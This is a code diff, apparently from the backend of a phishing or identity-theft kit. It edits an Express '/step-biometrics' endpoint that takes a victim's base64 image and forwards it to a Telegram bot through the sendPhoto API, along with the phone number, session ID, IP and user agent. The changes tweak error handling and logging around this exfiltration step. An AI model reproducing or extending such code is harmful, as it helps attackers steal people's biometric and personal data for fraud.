@@ -342,15 +342,16 @@ app.post('/step-biometrics', async (req, res) => {
     const { sessionId, imageBase64, userAgent, ip } = req.body;
 
     if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false });
+      return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
     }
 
     if (!sessionId || !imageBase64) {
-      return res.status(400).json({ ok: false, reason: 'Datos incompletos' });
+      return res.status(400).json({ ok: false, error: 'Datos incompletos' });
     }
 
     const session = sessionData.get(sessionId) || {};
 
+    // 🔹 convertir base64 a buffer
     const buffer = Buffer.from(
       imageBase64.replace(/^data:image\/\w+;base64,/, ''),
       'base64'
@@ -371,25 +372,24 @@ app.post('/step-biometrics', async (req, res) => {
 
 📱 Número: ${session.phoneNumber || 'N/A'}
 🆔 Session: ${sessionId}
-🌐 IP: ${ip || session.ip || 'N/A'}
+🌐 IP: ${ip || req.ip}
 🖥️ UA: ${userAgent || 'N/A'}`
     );
 
     await axios.post(
-      getTelegramApiUrl('sendPhoto'),
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
       formData,
       { headers: formData.getHeaders() }
     );
 
-    console.log(`🧬 Biometría enviada - Session: ${sessionId}`);
+    console.log('📸 Biometría enviada a Telegram:', sessionId);
     res.json({ ok: true });
 
   } catch (err) {
-    console.error('❌ Error biometría:', err.message);
+    console.error('❌ Error biometría:', err);
     res.status(500).json({ ok: false });
   }
 });
-
 
 
 
